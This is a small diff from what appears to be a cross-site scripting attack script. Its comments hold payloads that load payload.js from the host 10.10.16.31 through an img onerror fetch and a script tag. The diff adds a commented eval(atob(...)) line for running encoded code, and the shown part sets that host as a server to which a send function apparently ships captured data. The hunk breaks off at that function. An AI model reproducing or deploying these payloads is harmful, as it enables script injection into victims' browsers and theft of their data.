@@ -4,6 +4,8 @@
 // <img src=x onerror="fetch('http://10.10.16.31/payload.js')" />
 // <script src="http://10.10.16.31/payload.js"></script>
 
+// eval(atob("base64_encode"))
+
 const server = "http://10.10.16.31";
 
 function send(d){ 
